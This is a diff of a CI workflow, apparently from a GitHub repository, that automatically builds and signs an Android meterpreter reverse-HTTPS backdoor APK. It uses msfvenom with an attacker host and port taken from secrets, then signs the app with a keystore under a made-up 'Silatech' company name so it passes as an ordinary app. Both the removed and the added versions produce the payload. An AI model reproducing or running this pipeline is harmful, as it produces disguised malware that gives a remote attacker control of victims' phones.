@@ -1,4 +1,4 @@
-name: SILA PRO - Build APK with Docker
+name: SILA PRO - Build APK
 
 on:
   push:
@@ -8,39 +8,30 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
+    container:
+      image: kalilinux/kali-rolling:latest
 
     steps:
     - name: Checkout
       uses: actions/checkout@v4
 
-    - name: Install Build Tools
+    - name: Install Required Tools
       run: |
-        sudo apt-get update
-        sudo apt-get install -y openjdk-17-jdk apksigner wget
-        wget -q https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool
-        chmod +x /usr/local/bin/apktool
-        wget -q https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O /usr/local/bin/apktool.jar
+        apt-get update -y
+        apt-get install -y metasploit-framework apktool default-jdk apksigner
 
-    - name: Generate APK using Docker
+    - name: Generate and Sign APK
       env:
         LHOST: ${{ secrets.LHOST }}
         LPORT: ${{ secrets.LPORT }}
       run: |
         mkdir -p output
-        docker run --rm \
-          -v $(pwd)/output:/output \
-          metasploitframework/metasploit-framework:latest \
-          /bin/bash -c "/opt/metasploit-framework/bin/msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -o /output/sila_raw.apk"
-
-    - name: Sign APK
-      run: |
-        if [ -f output/sila_raw.apk ]; then
-          keytool -genkey -v -keystore output/sila.keystore -alias sila -keyalg RSA -keysize 2048 -validity 10000 -storepass sila123 -keypass sila123 -dname "CN=SILA,OU=Dev,O=Silatech,L=DSM,ST=Iowa,C=US"
-          apksigner sign --ks output/sila.keystore --ks-pass pass:sila123 --out output/sila_final.apk output/sila_raw.apk
-        else
-          echo "APK generation failed!"
-          exit 1
-        fi
+        # Generate payload
+        msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -o output/sila_raw.apk
+        # Create keystore
+        keytool -genkey -v -keystore output/sila.keystore -alias sila -keyalg RSA -keysize 2048 -validity 10000 -storepass sila123 -keypass sila123 -dname "CN=SILA, OU=Dev, O=Silatech, L=DSM, C=TZ"
+        # Sign APK
+        apksigner sign --ks output/sila.keystore --ks-pass pass:sila123 --out output/sila_final.apk output/sila_raw.apk
 
     - name: Upload APK
       uses: actions/upload-artifact@v4
